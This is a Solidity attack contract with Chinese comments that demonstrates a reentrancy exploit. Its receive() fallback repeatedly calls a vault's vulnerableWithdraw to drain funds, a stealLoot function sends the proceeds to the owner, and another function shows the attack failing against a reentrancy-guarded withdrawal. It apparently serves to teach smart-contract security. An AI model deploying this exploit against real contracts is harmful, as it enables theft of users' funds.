// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// 被攻击合约的接口（Vault）
interface IVault {
    function deposit() external payable;
    function vulnerableWithdraw() external; // 存在漏洞的提现函数
    function safeWithdraw() external;       // 已修复（带防重入）的提现函数
}

// 攻击合约（黑客）
contract GoldThief {

    // 目标合约地址
    IVault public targetVault;

    // 攻击者地址
    address public owner;

    // 重入调用次数（用于控制攻击次数）
    uint public attackCount;

    // 标记当前是否在攻击安全版本
    bool public attackingSafe;

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    // 攻击存在漏洞的提现函数
    function attackVulnerable() external payable {

        // 只有攻击者本人可以调用
        require(msg.sender == owner, "Only owner");

        // 至少需要 1 ETH 作为初始存款
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");

        attackingSafe = false;
        attackCount = 0;

        // 先存钱进入 Vault
        targetVault.deposit{value: msg.value}();

        // 发起第一次提现（触发重入）
        targetVault.vulnerableWithdraw();
    }

    // 攻击安全版本（用于演示失败）
    function attackSafe() external payable {

        require(msg.sender == owner, "Only owner");
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        attackingSafe = true;
        attackCount = 0;

        // 存钱
        targetVault.deposit{value: msg.value}();

        // 尝试攻击安全函数（通常会失败）
        targetVault.safeWithdraw();
    }

    // 当合约收到 ETH 时自动触发（关键攻击点）
    receive() external payable {

        // 每次重入次数 +1
        attackCount++;

        // 如果是在攻击漏洞函数，并且Vault还有钱，就继续递归调用
        if (
            !attackingSafe &&
            address(targetVault).balance >= 1 ether &&
            attackCount < 5 // 限制次数避免gas耗尽
        ) {
            // 再次调用 vulnerableWithdraw → 形成重入攻击
            targetVault.vulnerableWithdraw();
        }

        // 如果攻击的是安全版本（带 nonReentrant）
        if (attackingSafe) {
            // 这里会失败（因为防重入锁）
            targetVault.safeWithdraw();
        }
    }

    
    function stealLoot() external {
        require(msg.sender == owner, "Only owner");

        // 使用 call 替代 transfer（推荐方式），这里原代码有个报错，gas cost变化
        (bool success, ) = payable(owner).call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    // 查看当前攻击合约余额
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}